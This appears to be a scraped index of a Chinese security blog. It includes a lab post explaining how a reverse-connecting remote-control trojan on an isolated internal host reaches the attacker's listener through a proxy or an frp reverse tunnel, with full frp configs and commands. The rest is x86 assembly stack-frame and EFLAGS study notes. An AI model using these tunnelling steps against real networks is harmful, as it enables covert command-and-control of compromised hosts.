内网渗透神器CobaltStrike之DNS Beacon(四) _ DNS Beacon使用演示 《A-TEAM 团队的 CS 4.0 用户手册》 汉化使用手册 DNS Beacon (Cobalt Strike 4.0) cs4.0 DNS Beacon演示视频 CS上线之DNS隧道踩坑记 一些细节 COBALTSTRIKE DNS BEACON LAB SETUP 虚拟机方案的参考文章，但是配了A记录 cobaltstrike dns beacon知多少 原理 踩坑记录-DNS Beacon DNS Beacon上线后报文分析 初探Cobalt Strike–Beacon(一) 源码分析","tags":["Cobalt Strike"],"categories":["安全技术","渗透工具"]},{"title":"代理穿透与反向代理","path":"/posts/8eabe7df.html","content":"网络拓扑环境图 网络拓扑图如下：内网主机A，内网主机B；攻击者主机C A不能上外网，B能上外网 A与B互连，B与C互连，C访问不到A 代理穿透 环境描述： 虚拟机B通过某些软件使其成为代理服务器，监听端口假设为7777，监听来自端口的请求。A设置代理服务器的ip地址和端口7777，便能上外网 上线描述： 目标端程序配置反连地址为攻击者主机C，192.168.147.147，端口6666 在虚拟机A上运行，目标端程序能自动读取A上的代理配置，通过代理服务器B反连到攻击者主机上。 上线列表中的ip地址为代理服务器B的ip地址。 样例 虚拟机B为Windows Server 2008，在其上面搭建TMG代理服务器，端口8080。 虚拟机A在系统代理中设置代理为192.168.242.220:8080，便能上外网。 目标端程序反连地址与端口配置为：192.168.147.147:6666，攻击者主机C开启监听端口6666。 目标端程序在主机A上运行，进行代理穿透，实现上线。 反向代理 环境描述： 攻击者主机C与靶机B之间已构建反向代理通道，攻击者主机为client，虚拟机B为server。 上线描述： 目标端程序配置反连地址为虚拟机B，192.168.242.220，端口为反向代理server访问端口6000 攻击者主机C监听端口与反向代理client端口相同，为6666. 在虚拟机A上运行，目标端程序反连虚拟机B:6000，虚拟机B再将其送到反向代理客户端6666，实现上线 上线列表中的ip地址为靶机主机A的ip地址。 样例 以反向代理工具frp为例，在B与C之间构建反向代理。 frpc在攻击者主机C上运行，frps在虚拟机B上运行。 frpc.ini配置文件内容为： 123456789[common]server_addr = 192.168.147,133\t#服务端ip地址server_port = 7000 #服务端端口[test]type = tcp #转发的协议类型local_ip = 127.0.0.1 #客户端ip地址local_port = 6666 #客户端端口remote_port = 6000 #服务端远程访问端口 1frpc.exe -c frpc.ini frps.ini配置文件内容为： 12[common]bind_port = 7000 1frps.exe -c frps.ini 目标端程序反连地址与端口配置为：192.168.242.220:6000，攻击者主机C开启监听端口6666。 目标端程序在主机A上运行，通过反向代理出网，实现上线。 小结 方式 代理穿透 反向代理 前置条件 B通过某些软件搭建成为代理服务器，A通过设置B的ip和端口作为代理服务器进行上网 攻击者主机C与靶机B之间已构建反向代理通道，攻击者主机为client，虚拟机B为server 目标端程序配置 1. 反弹马地址配置为：192.168.147.147（攻击者主机C），监听端口66662. 程序放在内网主机A上执行 1.反弹马地址配置为：192.168.242.220（内网主机B）,端口6000（反向代理远程访问端口）2. 程序放在内网主机A上执行 执行后发生了什么 木马能够自动读取代理类型，让内网主机A通过代理服务器出网，反弹上线 内网主机A连接内网主机B:6000，因为反向代理，转发给攻击者主机C，实现上线 差异： 差异 代理穿透 反向代理 目标端程序配置的反弹地址 攻击者主机 代理服务器 上线ip地址 代理服务器 靶机本身","tags":["代理穿透","反向代理"],"categories":["安全技术","远控木马"]},{"title":"关于","path":"/about/index.html","content":"About Me 2022年信安专业本科毕业，自学二进制技术ing，怕什么真理无穷，进一寸便有一寸的欢喜。 💻热爱计算机底层技术和信息安全技术 🐱‍🏍二进制技术爱好者（目前是Windows方向） 😁机灵古怪 😘永远热爱，永远年轻相知 🧐对一切新鲜的事物充满好奇 currently seeking opportunities in the field of binary analysis. Please feel free to contact me by sending an email to 2332521827@qq.com. Thank you! About Blog 学习笔记和思考记录，还有一些生活碎片，与君共勉。"},{"title":"堆栈图","path":"/wiki/Assembly_Language/堆栈图.html","content":"函数 计算机的函数，是一个固定的一个程序段，或称其为一个子程序，它在可以实现固定运算功能的同时还带有一入口和一个出口，所谓的入口，就是函数所带的各个参数，我们可以通过这个入口，把函数的参数值代入子程序，供计算机处理，所谓出口，就是指函数的计算结果,也称为返回值，在计算机求得之后，由出口带回给调用它的程序。 有一个入口和一个出口，入口可以带参，也可以不带参；出口返回时可以带参，也可以不带参。 汇编中的函数 函数的特征和结构如下： 12345678910111213141516171819202122232425PUSH EBP ;提升堆栈，为函数执行提供空间MOV EBP,ESPSUB ESP,40PUSH EBX ;保留现场：函数在执行的时候会用到一些寄存器，但这些寄存器中的值很可能会被后面的PUSH ESI ;程序用到，所以要先存储到内存中PUSH EDILEA EDI,DWORD PTR SS:[EBP-40] ;向分配的空间填充数据MOV ECX,10 ;这里是别的函数留下的数据MOV EAX,CCCCCCCC ;防止eip跑到这将数据当成代码执行，填充0xCC，对应Unicode烫，int3，eip指向这执行会停下来REP STOS DWORD PTR ES:[EDI]MOV EAX,DWORD PTR SS:[EBP+8] ;该函数的功能ADD EAX,DWORD PTR SS:[EBP+C]POP EDI ;恢复现场：将之前保留的寄存器的值恢复POP ESIPOP EBXMOV ESP,EBP ;降低堆栈POP EBP ;恢复栈底RETN ;函数执行完毕，返回到调用处 函数的入口 1234PUSH 2 ;函数的参数PUSH 1CALL 0040100A ;调用函数 思考：此处我们是通过寄存器将需要的数据传递给函数的，还可以有其他的方式吗？ 堆栈 函数的出口 12MOV EAX,DWORD PTR SS:[EBP+8] ;上面的这个函数将计算结果存储到EAX中ADD EAX,DWORD PTR SS:[EBP+C] ;我们称为返回值 思考：函数的计算结果除了放在寄存器中，还可以放在什么地方？ 内存。 Windows堆栈的特点 先进后出 向低地址扩展 画堆栈图练习 函数 第1题：0x401174 调用前寄存器情况： EAX 00000003 ECX 00000000 EDX 007713C0 EBX 003AB000 ESP 0019FEE4 EBP 0019FF30 ESI 00401220 EDI 0019FF30 1234500401174 |. 6A 04 PUSH 400401176 |. 6A 03 PUSH 300401178 |. 6A 02 PUSH 20040117A |. E8 9AFEFFFF CALL HelloWor.004010190040117F |. 83C4 0C ADD ESP,0C 100401019 $ /E9 52000000 JMP HelloWor.00401070 1234567891011121314151617181900401070 /&gt; \\55 PUSH EBP00401071 |. 8BEC MOV EBP,ESP00401073 |. 83EC 40 SUB ESP,4000401076 |. 53 PUSH EBX00401077 |. 56 PUSH ESI00401078 |. 57 PUSH EDI00401079 |. 8D7D C0 LEA EDI,DWORD PTR SS:[EBP-40]0040107C |. B9 10000000 MOV ECX,1000401081 |. B8 CCCCCCCC MOV EAX,CCCCCCCC00401086 |. F3:AB REP STOS DWORD PTR ES:[EDI]00401088 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040108B |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]0040108E |. 2B45 10 SUB EAX,DWORD PTR SS:[EBP+10]00401091 |. 5F POP EDI00401092 |. 5E POP ESI00401093 |. 5B POP EBX00401094 |. 8BE5 MOV ESP,EBP00401096 |. 5D POP EBP00401097 \\. C3 RETN 第2题：0x401182 调用前寄存器情况： EAX 00000001 ECX 00000000 EDX 007713C0 EBX 003AB000 ESP 0019FEE4 EBP 0019FF30 ESI 00401220 EDI 0019FF30 123400401182 |. 6A 06 PUSH 600401184 |. 6A 05 PUSH 500401186 |. E8 7AFEFFFF CALL HelloWor.004010050040118B |. 83C4 08 ADD ESP,8 100401005 $ /E9 A6000000 JMP HelloWor.004010B0 12345678910111213141516171819202122004010B0 /&gt; \\55 PUSH EBP004010B1 |. 8BEC MOV EBP,ESP004010B3 |. 83EC 48 SUB ESP,48004010B6 |. 53 PUSH EBX004010B7 |. 56 PUSH ESI004010B8 |. 57 PUSH EDI004010B9 |. 8D7D B8 LEA EDI,DWORD PTR SS:[EBP-48]004010BC |. B9 12000000 MOV ECX,12004010C1 |. B8 CCCCCCCC MOV EAX,CCCCCCCC004010C6 |. F3:AB REP STOS DWORD PTR ES:[EDI]004010C8 |. C745 FC 0A000&gt;MOV DWORD PTR SS:[EBP-4],0A004010CF |. C745 F8 05000&gt;MOV DWORD PTR SS:[EBP-8],5004010D6 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]004010D9 |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]004010DC |. 2B45 F8 SUB EAX,DWORD PTR SS:[EBP-8]004010DF |. 0345 FC ADD EAX,DWORD PTR SS:[EBP-4]004010E2 |. 5F POP EDI004010E3 |. 5E POP ESI004010E4 |. 5B POP EBX004010E5 |. 8BE5 MOV ESP,EBP004010E7 |. 5D POP EBP004010E8 \\. C3 RETN 第三题：0x40118E 调用前寄存器情况： EAX 00000010 ECX 00000000 EDX 007713C0 EBX 003AB000 ESP 0019FEE4 EBP 0019FF30 ESI 00401220 EDI 0019FF30 123450040118E |. 6A 09 PUSH 900401190 |. 6A 0C PUSH 0C00401192 |. 6A 05 PUSH 500401194 |. E8 85FEFFFF CALL HelloWor.0040101E00401199 |. 83C4 0C ADD ESP,0C 10040101E $ /E9 DD000000 JMP HelloWor.00401100 123456789101112131415161718192021222324252627282930313200401100 /&gt; \\55 PUSH EBP00401101 |. 8BEC MOV EBP,ESP00401103 |. 83EC 40 SUB ESP,4000401106 |. 53 PUSH EBX00401107 |. 56 PUSH ESI00401108 |. 57 PUSH EDI00401109 |. 8D7D C0 LEA EDI,DWORD PTR SS:[EBP-40]0040110C |. B9 10000000 MOV ECX,1000401111 |. B8 CCCCCCCC MOV EAX,CCCCCCCC00401116 |. F3:AB REP STOS DWORD PTR ES:[EDI]00401118 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040111B |. 3B45 0C CMP EAX,DWORD PTR SS:[EBP+C]0040111E |. 7E 12 JLE SHORT HelloWor.0040113200401120 |. 8B4D 08 MOV ECX,DWORD PTR SS:[EBP+8]00401123 |. 3B4D 10 CMP ECX,DWORD PTR SS:[EBP+10]00401126 |. 7E 05 JLE SHORT HelloWor.0040112D00401128 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040112B |. EB 15 JMP SHORT HelloWor.004011420040112D |&gt; 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10]00401130 |. EB 10 JMP SHORT HelloWor.0040114200401132 |&gt; 8B55 0C MOV EDX,DWORD PTR SS:[EBP+C]00401135 |. 3B55 10 CMP EDX,DWORD PTR SS:[EBP+10]00401138 |. 7E 05 JLE SHORT HelloWor.0040113F0040113A |. 8B45 0C MOV EAX,DWORD PTR SS:[EBP+C]0040113D |. EB 03 JMP SHORT HelloWor.004011420040113F |&gt; 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10]00401142 |&gt; 5F POP EDI00401143 |. 5E POP ESI00401144 |. 5B POP EBX00401145 |. 8BE5 MOV ESP,EBP00401147 |. 5D POP EBP00401148 \\. C3 RETN 1234567891011121314151617181920212223242526272829303100401118 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040111B |. 3B45 0C CMP EAX,DWORD PTR SS:[EBP+C]0040111E |. 7E 12 JLE SHORT HelloWor.00401132 ;参数1和参数2比大小 ;参数1&gt;参数2，顺序执行继续比较 ;参数1&lt;=参数2，跳00401132继续比较00401120 |. 8B4D 08 MOV ECX,DWORD PTR SS:[EBP+8]00401123 |. 3B4D 10 CMP ECX,DWORD PTR SS:[EBP+10]00401126 |. 7E 05 JLE SHORT HelloWor.0040112D ;参数1和参数3比大小 ;参数1&gt;参数3，顺序执行赋值结束调用 ;参数1&lt;=参数3，跳0040112D赋值结束调用00401128 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040112B |. EB 15 JMP SHORT HelloWor.00401142 ;EAX=参数1，结束调用0040112D |&gt; 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10]00401130 |. EB 10 JMP SHORT HelloWor.00401142 ;EAX=参数3，结束调用00401132 |&gt; 8B55 0C MOV EDX,DWORD PTR SS:[EBP+C]00401135 |. 3B55 10 CMP EDX,DWORD PTR SS:[EBP+10]00401138 |. 7E 05 JLE SHORT HelloWor.0040113F ;参数2和参数3比大小 ;参数2&gt;参数3，顺序执行赋值结束调用 ;参数2&lt;=参数3，跳0040113F赋值结束调用0040113A |. 8B45 0C MOV EAX,DWORD PTR SS:[EBP+C]0040113D |. EB 03 JMP SHORT HelloWor.00401142 ;EAX=参数2，结束调用0040113F |&gt; 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10] ;EAX=参数300401142 |&gt; 5F POP EDI 函数接收3个参数，返回最大值 123456789101112131415161718192021222324252627int main(int a,int b,int c)&#123; int result; if(a&gt;b) &#123; if(a&gt;c) &#123; result=a; &#125; else &#123; result=c; &#125; &#125; else &#123; if(b&gt;c) &#123; result=b; &#125; else &#123; result=c; &#125; &#125; return result;&#125; 函数嵌套 Stack.exe，从0040D518开始画，画到0040D527 调用前寄存器情况： EAX CCCCCCCC ECX 00000000 EDX 00AC13B0 EBX 00388000 ESP 0019FEDC EBP 0019FF30 ESI 004010F0 EDI 0019FF30 最外层第一层函数0040100F第二层函数00401019第三层函数0040101412345670040D518 |. 6A 07 PUSH 70040D51A |. 6A 06 PUSH 60040D51C |. 6A 05 PUSH 50040D51E |. 6A 04 PUSH 40040D520 |. 6A 03 PUSH 30040D522 |. E8 E83AFFFF CALL Stack.0040100F0040D527 |. 83C4 14 ADD ESP,1410040100F $ /E9 8CC40000 JMP Stack.0040D4A0 1234567891011121314151617181920212223242526272829303132333435360040D4A0 /&gt; \\55 PUSH EBP0040D4A1 |. 8BEC MOV EBP,ESP0040D4A3 |. 83EC 4C SUB ESP,4C0040D4A6 |. 53 PUSH EBX0040D4A7 |. 56 PUSH ESI0040D4A8 |. 57 PUSH EDI0040D4A9 |. 8D7D B4 LEA EDI,DWORD PTR SS:[EBP-4C]0040D4AC |. B9 13000000 MOV ECX,130040D4B1 |. B8 CCCCCCCC MOV EAX,CCCCCCCC0040D4B6 |. F3:AB REP STOS DWORD PTR ES:[EDI]0040D4B8 |. C745 FC 02000&gt;MOV DWORD PTR SS:[EBP-4],20040D4BF |. C745 F8 03000&gt;MOV DWORD PTR SS:[EBP-8],30040D4C6 |. 8B45 14 MOV EAX,DWORD PTR SS:[EBP+14]0040D4C9 |. 50 PUSH EAX0040D4CA |. 8B4D 10 MOV ECX,DWORD PTR SS:[EBP+10]0040D4CD |. 51 PUSH ECX0040D4CE |. 8B55 0C MOV EDX,DWORD PTR SS:[EBP+C]0040D4D1 |. 52 PUSH EDX0040D4D2 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040D4D5 |. 50 PUSH EAX0040D4D6 |. E8 3E3BFFFF CALL Stack.004010190040D4DB |. 83C4 10 ADD ESP,100040D4DE |. 8945 F4 MOV DWORD PTR SS:[EBP-C],EAX0040D4E1 |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040D4E4 |. 0345 F8 ADD EAX,DWORD PTR SS:[EBP-8]0040D4E7 |. 0345 18 ADD EAX,DWORD PTR SS:[EBP+18]0040D4EA |. 0345 F4 ADD EAX,DWORD PTR SS:[EBP-C]0040D4ED |. 5F POP EDI0040D4EE |. 5E POP ESI0040D4EF |. 5B POP EBX0040D4F0 |. 83C4 4C ADD ESP,4C0040D4F3 |. 3BEC CMP EBP,ESP0040D4F5 |. E8 B63BFFFF CALL Stack.004010B00040D4FA |. 8BE5 MOV ESP,EBP0040D4FC |. 5D POP EBP0040D4FD \\. C3 RETN MOV ESP,EBP之前这三行代码是编译器加的，编译器会在debug版自动加上这三行，用来检验堆栈是否平衡。因为它觉得你在一个call里又调用了一个call，准备返回时堆栈会不会不平衡。 1230040D4F0 |. 83C4 4C ADD ESP,4C0040D4F3 |. 3BEC CMP EBP,ESP0040D4F5 |. E8 B63BFFFF CALL Stack.004010B0 因为我们没对堆栈作其他操作，堆栈是平衡的，ESP-4C后和EBP相等，ZF=1。CALL 004010B0后。JNZ不跳转，走RETN退出；如果不平衡，即ZF=0，JNZ跳转到004010B3，004010B3部分是出错提示。 12345678910111213141516171819202122232425262728004010B0 /$ /75 01 JNZ SHORT Stack.004010B3004010B2 |. |C3 RETN004010B3 |&gt; \\55 PUSH EBP004010B4 |. 8BEC MOV EBP,ESP004010B6 |. 83EC 00 SUB ESP,0004010B9 |. 50 PUSH EAX004010BA |. 52 PUSH EDX004010BB |. 53 PUSH EBX004010BC |. 56 PUSH ESI004010BD |. 57 PUSH EDI004010BE |. 68 30204200 PUSH Stack.00422030 ; /Arg5 = 00422030 ASCII &quot;The value of ESP was not properly saved across a function call. This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention. &quot;004010C3 |. 68 2C204200 PUSH Stack.0042202C ; |Arg4 = 0042202C004010C8 |. 6A 2A PUSH 2A ; |Arg3 = 0000002A004010CA |. 68 1C204200 PUSH Stack.0042201C ; |Arg2 = 0042201C ASCII &quot;i386\\chkesp.c&quot;004010CF |. 6A 01 PUSH 1 ; |Arg1 = 00000001004010D1 |. E8 BA020000 CALL Stack.00401390 ; \\Stack.00401390004010D6 |. 83C4 14 ADD ESP,14004010D9 |. 83F8 01 CMP EAX,1004010DC |. 75 01 JNZ SHORT Stack.004010DF004010DE |. CC INT3004010DF |&gt; 5F POP EDI004010E0 |. 5E POP ESI004010E1 |. 5B POP EBX004010E2 |. 5A POP EDX004010E3 |. 58 POP EAX004010E4 |. 8BE5 MOV ESP,EBP004010E6 |. 5D POP EBP004010E7 \\. C3 RETN 100401019 $ /E9 42000000 JMP Stack.00401060 123456789101112131415161718192021222324252627282930313200401060 /&gt; \\55 PUSH EBP00401061 |. 8BEC MOV EBP,ESP00401063 |. 83EC 48 SUB ESP,4800401066 |. 53 PUSH EBX00401067 |. 56 PUSH ESI00401068 |. 57 PUSH EDI00401069 |. 8D7D B8 LEA EDI,DWORD PTR SS:[EBP-48]0040106C |. B9 12000000 MOV ECX,1200401071 |. B8 CCCCCCCC MOV EAX,CCCCCCCC00401076 |. F3:AB REP STOS DWORD PTR ES:[EDI]00401078 |. C745 FC 02000&gt;MOV DWORD PTR SS:[EBP-4],20040107F |. 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10]00401082 |. 50 PUSH EAX00401083 |. 8B4D 0C MOV ECX,DWORD PTR SS:[EBP+C]00401086 |. 51 PUSH ECX00401087 |. 8B55 08 MOV EDX,DWORD PTR SS:[EBP+8]0040108A |. 52 PUSH EDX0040108B |. E8 84FFFFFF CALL Stack.0040101400401090 |. 83C4 0C ADD ESP,0C00401093 |. 8945 F8 MOV DWORD PTR SS:[EBP-8],EAX00401096 |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]00401099 |. 0345 F8 ADD EAX,DWORD PTR SS:[EBP-8]0040109C |. 0345 14 ADD EAX,DWORD PTR SS:[EBP+14]0040109F |. 5F POP EDI004010A0 |. 5E POP ESI004010A1 |. 5B POP EBX004010A2 |. 83C4 48 ADD ESP,48004010A5 |. 3BEC CMP EBP,ESP004010A7 |. E8 04000000 CALL Stack.004010B0004010AC |. 8BE5 MOV ESP,EBP004010AE |. 5D POP EBP004010AF \\. C3 RETN MOV ESP,EBP之前这三行代码是编译器加的，编译器会在debug版自动加上这三行，用来检验堆栈是否平衡。因为它觉得你在一个call里又调用了一个call，准备返回时堆栈会不会不平衡。 123004010A2 |. 83C4 48 ADD ESP,48004010A5 |. 3BEC CMP EBP,ESP004010A7 |. E8 04000000 CALL Stack.004010B0 因为我们没对堆栈作其他操作，堆栈是平衡的，ESP-48后和EBP相等，ZF=1。CALL 004010B0后。JNZ不跳转，走RETN退出；如果不平衡，即ZF=0，JNZ跳转到004010B3，004010B3部分是出错提示。 12345678910111213141516171819202122232425262728004010B0 /$ /75 01 JNZ SHORT Stack.004010B3004010B2 |. |C3 RETN004010B3 |&gt; \\55 PUSH EBP004010B4 |. 8BEC MOV EBP,ESP004010B6 |. 83EC 00 SUB ESP,0004010B9 |. 50 PUSH EAX004010BA |. 52 PUSH EDX004010BB |. 53 PUSH EBX004010BC |. 56 PUSH ESI004010BD |. 57 PUSH EDI004010BE |. 68 30204200 PUSH Stack.00422030 ; /Arg5 = 00422030 ASCII &quot;The value of ESP was not properly saved across a function call. This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention. &quot;004010C3 |. 68 2C204200 PUSH Stack.0042202C ; |Arg4 = 0042202C004010C8 |. 6A 2A PUSH 2A ; |Arg3 = 0000002A004010CA |. 68 1C204200 PUSH Stack.0042201C ; |Arg2 = 0042201C ASCII &quot;i386\\chkesp.c&quot;004010CF |. 6A 01 PUSH 1 ; |Arg1 = 00000001004010D1 |. E8 BA020000 CALL Stack.00401390 ; \\Stack.00401390004010D6 |. 83C4 14 ADD ESP,14004010D9 |. 83F8 01 CMP EAX,1004010DC |. 75 01 JNZ SHORT Stack.004010DF004010DE |. CC INT3004010DF |&gt; 5F POP EDI004010E0 |. 5E POP ESI004010E1 |. 5B POP EBX004010E2 |. 5A POP EDX004010E3 |. 58 POP EAX004010E4 |. 8BE5 MOV ESP,EBP004010E6 |. 5D POP EBP004010E7 \\. C3 RETN 100401014 $ /E9 07000000 JMP Stack.00401020 1234567891011121314151617181900401020 /&gt; \\55 PUSH EBP00401021 |. 8BEC MOV EBP,ESP00401023 |. 83EC 40 SUB ESP,4000401026 |. 53 PUSH EBX00401027 |. 56 PUSH ESI00401028 |. 57 PUSH EDI00401029 |. 8D7D C0 LEA EDI,DWORD PTR SS:[EBP-40]0040102C |. B9 10000000 MOV ECX,1000401031 |. B8 CCCCCCCC MOV EAX,CCCCCCCC00401036 |. F3:AB REP STOS DWORD PTR ES:[EDI]00401038 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040103B |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]0040103E |. 0345 10 ADD EAX,DWORD PTR SS:[EBP+10]00401041 |. 5F POP EDI00401042 |. 5E POP ESI00401043 |. 5B POP EBX00401044 |. 8BE5 MOV ESP,EBP00401046 |. 5D POP EBP00401047 \\. C3 RETN 函数功能：一系列整数加法操作 12345678910111213141516171819202122232425int fun3(int a,int b,int c)&#123; return a+b+c;&#125;int fun2(int a,int b,int c,int d)&#123; int x=2; int y=fun3(a,b,c); return x+y+d;&#125;int fun1(int a,int b,int c,int d,int e)&#123; int x=2; int y=3; int z=fun2(a,b,c,d); return x+y+e+z;&#125;int main()&#123; int result=fun1(3,4,5,6,7); return result;&#125;"},{"title":"小结","path":"/wiki/Assembly_Language/小结_assembly.html","content":"因为之前看过并做完了这两本书上的练习：《汇编语言4th-王爽》-&gt;《汇编语言-基于x86处理器-第七版》，海哥视频讲的几乎全会，启发比较少。如果你有充裕的时间，可以先看《汇编语言4th-王爽》，因为16位汇编比较简单，加之王爽老师这本书写得很好，容易学习。如果有不懂的习题，可以去官方论坛看前辈的帖子，虽然发帖回帖时间都是零几零几年的，但足以学习，我之前看的时候就经常感慨十几二十年前的前辈对于汇编理解程度之深。然后看黑皮书《汇编语言-基于x86处理器-第七版》并完成课后习题，这本书主要是讲32位汇编，顺便提及x64的语法。这样看完两本书，你对于汇编的理解会很扎实。海哥视频的汇编部分我感觉还是压缩了很多内容，可能因为是从逆向角度来讲解汇编。所以这篇小结几乎没想写什么内容。 汇编常用指令就是那些，这里不作小结。注意一条指令会影响哪些标志位。（黑皮书后的指令附录可以当工具书来查） 标志寄存器和JCC指令，跳转情况，经常查就行，不需要记忆。 摘自王爽《汇编语言》的论坛主题 : : 由第11章检测题　第3题引出的思考：怎么判断计算机进行的是有符号数运算还是无符号数运算？ 一个数是不是有符号数取决于程序员对参与运算的数最高位的使用：认为参与运算的数的最高位是符号位，则是有符号数；认为参与运算的数是最高位是有效位，则是无符号数。其实计算机在进行加减运算时是不知道所处理的数是有符号数还是无符号数，计算机在进行加减运算时，是将运算结果作为有符号数和无符号数对符号位的影响都通过标志寄存器“罗列”出来，供编程者使用。 海哥的视频，给到我的知识点和启发就是： 要知道指令背后发生的事，可用哪些等价指令进行替换。用途：指令的变形 要对堆栈变化非常熟悉 参考 链接/书籍 备注 滴水逆向课程笔记-三期汇编语言 笔记参考 滴水逆向3期笔记与作业——01汇编 笔记参考 《汇编语言4th-王爽》 《汇编语言-基于x86处理器-中文第七版》 海哥三期的汇编视频部分 汇编（六）JCC指令 拷了那个JCC表 汇编JCC指令表 拷了那个JCC表"},{"title":"标志寄存器和JCC指令","path":"/wiki/Assembly_Language/标志寄存器和JCC指令.html","content":"EFLAGS寄存器 《白皮书一卷》3.4.3 EFLAGS Register P77 DF Flag The direction flag (DF, located in bit 10 of the EFLAGS register) controls string instructions (MOVS, CMPS, SCAS, LODS, and STOS). The STD and CLD instructions set and clear the DF flag, respectively 12CLD;方向标志位清零（正向）STD;方向标志位置1（反向） Setting the DF flag causes the string instructions to auto-decrement (to process strings from high addresses to low addresses). Clearing the DF flag causes the string instructions to auto-increment (process strings from low addresses to high addresses). 方向标志位的值 对ESI和EDI的影响 地址顺序 0 增加 低到高 1 减少 高到低 Status Flags The status flags (bits 0, 2, 4, 6, 7, and 11) of the EFLAGS register indicate the results of arithmetic instructions, such as the ADD, SUB, MUL, and DIV instructions. The status flag functions are: CF (bit 0) Carry flag 若算术操作产生的结果在**最高有效位(most-significant bit)**发生进位或借位则将其置1，反之清零。 这个标志通常用来指示无符号整型运算的溢出状态。 进位 12mov al,0xFEadd al,2 借位 12mov al,0x7Fsub al,0xFF 但其实负数也是用补码表示，减法就是加法，所以不存在借位的说法 PF (bit 2) Parity flag 如果结果的最低有效字节(least-significant byte)包含偶数个1位则该位置1，否则清零。 在字操作时，最低有效字节就是低8位 在字节操作时，最低有效字节就是低4位 用途：网络传输中的奇偶校验检查。假设需要传输&quot;11001110&quot;，数据中含5个&quot;1&quot;，所以其奇校验位为&quot;0&quot;，同时把&quot;110011100&quot;传输给接收方，接收方收到数据后再一次计算奇偶性，“110011100&quot;中仍然含有5个&quot;1”，所以接收方计算出的奇校验位还是&quot;0&quot;，与发送方一致，表示在此次传输过程中未发生错误。 一个例子证明最低有效字节(least-significant byte)指哪部分：113+1 12mov ax,113add ax,1 123450000 0001 0001 0011 AX0000 0000 0000 0001 10000 0001 0001 0100 AX+1 看AX+1，如果最低有效位是以字节来看，那就是0001 0100，两个；如果是以字来看，那就是0000 0001 0001 0100，3个1。 执行上面两条指令后，PF=1，说明最低有效字节(least-significant byte)就是指这个数字最后的一个字节。 AF (bit 4) Auxiliary Carry flag — Set if an arithmetic operation generates a carry or a borrow out of bit 3 of the result; cleared otherwise. This flag is used in binary-coded decimal (BCD) arithmetic. 如果算术操作在结果的第3位发生进位或借位则将该标志置1，否则清零。这个标志在BCD(binary-code decimal)算术运算中被使用。 上面是原文，网上资料的是：表示加减法做到一半时有没有形成进位/借位，如果有则AF=1 在字操作时，发生低字节向高字节进位或借位时； 在字节操作时，发生低4位向高4位进位或借位时。 双字进位例子 12mov eax,0x55EEFFFFadd eax,2 字进位例子 12mov ax,5ffeadd ax,2 字节进位例子 12mov al,4eadd al,2 ZF (bit 6) Zero flag — Set if the result is zero; cleared otherwise. 常与CMP和TEST等指令一起使用。 SF (bit 7) Sign flag 该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负) 例子 123mov al,0x7Fadd al,2;执行后SF=0，负数 123mov al,0xFEadd al,2;执行后SF=1，正数 OF (bit 11) Overflow flag — Set if the integer result is too large a positive number or too small a negative number (excluding the sign-bit) to fit in the destination operand; cleared otherwise. This flag indicates an overflow condition for signed-integer (two’s complement) arithmetic. 用于反映有符号数加减运算所得结果是否溢出。 例子 123mov al,0x7Fadd al,2;执行后OF=1，溢出 如果是无符号数运算，是否溢出看CF位；如果是有符号数运算，是否溢出看OF位。 溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律: 正＋正=正，但如果结果是负数，则说明有溢出 负＋负=负，但如果结果是正数，则说明有溢出 正＋负，永远都不会有溢出。比如add al,3，8位有符号数所能表示的范围是-128-127，极端情况，最大的正数+最小的负数，127+（-1），不会溢出 海哥的讲法： 还是看这个圈，相加看成是往后查多少个数，绕圈转。 如果是无符号数，范围0-FF，两数运算，超过FF就是溢出 如果是有符号数，正数0-7F，负数80-FF。 两正数相加，但相加时走过7F走到负数的左半圈去了，就是溢出。 负数同理。 正+负，始终不会跑到另一个圈。 例子 无符号、有符号都不溢出 12mov al,8add al,8 无符号溢出、有符号不溢出 12mov al,0ffadd al,2 无符号不溢出、有符号溢出 12mov al,7fadd al,2 无符号、有符号都溢出 12mov al,0feadd al,80 计算机如何判断是否有溢出 比如80-40 12mov al,80sub al,40 -40相当于+(-40) 12mov al,80add al,0c0 1231000 00001100 0000--------- 符号有进位：1 最高有效数值位向符号位产生的进位：0 1 xor 0 ==1，所以OF=1 作业 熟练记住CF/PF/AF/ZF/SF/OF在EFLAGS的第几位 比较指令 CMP CMP（比较)指令执行从目的操作数中减去源操作数的隐含减法操作，并且不修改任何操作数： 1CMP destination,source 标志位 当实际的减法发生时,CMP指令按照计算结果修改溢出、符号、零、进位、辅助进位和奇偶标志位。 如果比较的是两个无符号数,则零标志位和进位标志位表示的两个操作数之间的关系如下表所示: CMP结果 ZF CF 备注 目的操作数＜源操作数 0 1 因为＜，不够减，发生了借位，CF=1 目的操作数＞源操作数 0 0 够减，没借位，CF=0 目的操作数＝源操作数 1 0 一样大，结果=0，ZF=1 如果比较的是两个有符号数,则符号标志位、零标志位和溢出标志位表示的两个操作数之间的关系如下表所示: CMP结果 标志位 备注 目的操作数＜源操作数 SF≠OF 目的操作数＞源操作数 SF=OF 目的操作数＝源操作数 ZF=1 一样大，结果=0，ZF=1 目的操作数＜源操作数（不够减） 目的操作数＞源操作数（够减） 正-正&lt;=&gt;正+负 比如2-3，结果为负，SF=1。正+负不会有溢出，OF=0 比如3-2，结果为正，SF=0。没有溢出，OF=0 正-负&lt;=&gt;正+正 